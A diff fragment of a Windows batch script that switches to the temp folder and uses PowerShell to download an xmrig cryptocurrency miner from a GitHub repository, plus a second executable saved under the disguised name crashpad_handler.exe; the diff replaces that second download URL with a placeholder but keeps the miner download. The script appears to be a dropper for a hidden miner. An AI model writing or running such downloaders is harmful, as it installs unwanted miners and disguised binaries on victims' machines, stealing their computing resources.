@@ -10,7 +10,7 @@ cd %temp%
 powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/xmrig.exe -OutFile xmrig.exe
 
 :c
-powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/WClient.exe -OutFile crashpad_handler.exe
+powershell -command Invoke-WebRequest !!! -OutFile crashpad_handler.exe
 
 if not exist xmrig.exe (
     goto x
